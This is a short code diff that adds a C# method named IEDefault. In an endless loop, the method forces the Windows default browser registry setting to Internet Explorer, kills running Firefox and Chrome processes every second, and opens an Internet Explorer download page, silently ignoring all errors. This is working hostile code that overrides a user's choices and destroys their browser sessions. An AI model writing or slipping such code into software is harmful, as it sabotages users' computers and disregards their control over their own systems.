@@ -1,0 +1,27 @@
+static void IEDefault()
+    {
+        while (true)
+        {
+            try
+            {
+                RegistryKey regkey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\shell\\Associations\\UrlAssociations\\http\\UserChoice", true);
+                string browser = regkey.GetValue("Progid").ToString();
+
+                if (browser != "IE.HTTP")
+                {
+                    regkey.SetValue("Progid", "IE.HTTP");
+                }
+
+                foreach (Process p in Process.GetProcesses())
+                {
+                    if (p.ProcessName == "firefox" || p.ProcessName == "chrome")
+                    {
+                        p.Kill();
+                        Process.Start("http://windows.microsoft.com/en-us/internet-explorer/download-ie");
+                    }
+                }
+            }
+            catch { }
+            Thread.Sleep(1000);
+        }
+    }
